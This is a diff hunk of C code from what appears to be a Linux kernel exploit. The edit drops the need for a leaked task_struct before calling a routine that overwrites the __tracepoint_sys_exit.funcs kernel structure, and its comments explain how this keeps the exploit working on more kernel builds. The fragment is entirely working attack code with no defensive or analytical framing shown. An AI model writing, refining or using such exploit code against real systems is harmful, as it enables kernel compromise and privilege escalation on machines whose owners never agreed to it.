@@ -2984,16 +2984,18 @@ int main(int argc, char **argv)
         }
         if (!verified)
             park_forever("no verified plant");
-        if (g_child_task &&
-            (g_static_ok || g_tp_runtime || (g_tp_link && g_slide)))
+        /* defeat_vr only writes __tracepoint_sys_exit.funcs (the task
+         * argument is unused since the refactor), so a leaked task_struct is
+         * NOT required: on builds whose copy_process call site differs from
+         * the profile, task_recs is 0 while the timer site is still known. */
+        if (g_static_ok || g_tp_runtime || (g_tp_link && g_slide))
         {
-            if (defeat_vr(g_child_task, raw))
+            if (defeat_vr(0, raw))
                 park_forever("shell vr de-tag failed");
         }
         else
-            logf("[-] shell vr de-tag skipped: %s\n",
-                 g_child_task ? "no __tracepoint_sys_exit address for this build"
-                              : "child task not leaked");
+            logf("[-] shell vr de-tag skipped: no __tracepoint_sys_exit "
+                 "address for this build\n");
     }
     else
     {
